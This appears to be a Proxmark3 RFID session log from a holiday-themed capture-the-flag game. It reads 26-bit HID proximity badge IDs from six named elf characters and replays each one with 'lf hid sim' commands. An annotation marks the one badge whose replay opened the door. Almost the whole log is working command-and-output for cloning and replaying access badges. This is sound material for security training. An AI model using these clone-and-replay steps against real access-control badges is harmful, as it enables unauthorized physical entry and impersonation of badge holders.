

  ██████╗ ███╗   ███╗█████╗ 
  ██╔══██╗████╗ ████║╚═══██╗
  ██████╔╝██╔████╔██║ ████╔╝
  ██╔═══╝ ██║╚██╔╝██║ ╚══██╗
  ██║     ██║ ╚═╝ ██║█████╔╝       Iceman ☕
  ╚═╝     ╚═╝     ╚═╝╚════╝    ❄️ bleeding edge

  https://github.com/rfidresearchgroup/proxmark3/

[=] Session log /home/elf/.proxmark3/logs/log_20201226.txt
[=] Creating initial preferences file
[=] Saving preferences...
[+] saved to json file /home/elf/.proxmark3/preferences.json

 [ Proxmark3 RFID instrument ]

 [ CLIENT ]
  client: RRG/Iceman/master/v4.9237-2066-g3de856045 2020-11-25 16:29:31
  compiled with GCC 7.5.0 OS:Linux ARCH:x86_64

 [ PROXMARK3 ]
  firmware.................. PM3RDV4
  external flash............ present
  smartcard reader.......... present
  FPC USART for BT add-on... absent

 [ ARM ]
  LF image built for 2s30vq100 on 2020-07-08 at 23: 8: 7
  HF image built for 2s30vq100 on 2020-07-08 at 23: 8:19
  HF FeliCa image built for 2s30vq100 on 2020-07-08 at 23: 8:30

 [ Hardware ]
  
  --= uC: AT91SAM7S512 Rev B
  --= Embedded Processor: ARM7TDMI
  --= Nonvolatile Program Memory Size: 512K bytes, Used: 304719 bytes (58%) Free: 219569 bytes (42%)
  --= Second Nonvolatile Program Memory Size: None
  --= Internal SRAM Size: 64K bytes
  --= Architecture Identifier: AT91SAM7Sxx Series
  --= Nonvolatile Program Memory Type: Embedded Flash Memory

### NEAR Noel Boetie

[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020

### NEAR Sparkle Redberry
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022

### NEAR Angel Candysalt
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040

### NEAR Holly Evergreen
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024

### NEAR Shinny Upatree --> WORKING ONE
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025

### NEAR Bow Ninecandle
[magicdust] pm3 --> lf hid read

#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023

[magicdust] pm3 --> lf hid sim -r 2006e22f08
[=] Simulating HID tag using raw 2006e22f08
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -w H10301 --fc 113 --cn 6020
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6020    parity: valid
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -r 2006e22f0d
[=] Simulating HID tag using raw 2006e22f0d
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -w H10301 --fc 113 --cn 6022
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6022    parity: valid
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -r 2006e22f31
[=] Simulating HID tag using raw 2006e22f31
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -w H10301 --fc 113 --cn 6040
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6040    parity: valid
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -r 2006e22f10
[=] Simulating HID tag using raw 2006e22f10
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -w H10301 --fc 113 --cn 6024
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6024    parity: valid
[=] Stopping simulation after 10 seconds.
[=] Done
[magicdust] pm3 --> lf hid sim -r 2006e22f13   ##### ----THIS ONE OPENED THE DOOR
[=] Simulating HID tag using raw 2006e22f13
[=] Stopping simulation after 10 seconds.


[=] Done
[magicdust] pm3 --> lf hid sim -w H10301 --fc 113 --cn 6025
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6025    parity: valid
[=] Stopping simulation after 10 seconds.


[=] Done
[magicdust] pm3 --> lf hid sim -r 2006e22f0e
[=] Simulating HID tag using raw 2006e22f0e
[=] Stopping simulation after 10 seconds.


[=] Done
[magicdust] pm3 --> lf hid sim -w H10301 --fc 113 --cn 6023
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6023    parity: valid
[=] Stopping simulation after 10 seconds.


[=] Done
[magicdust] pm3 --> 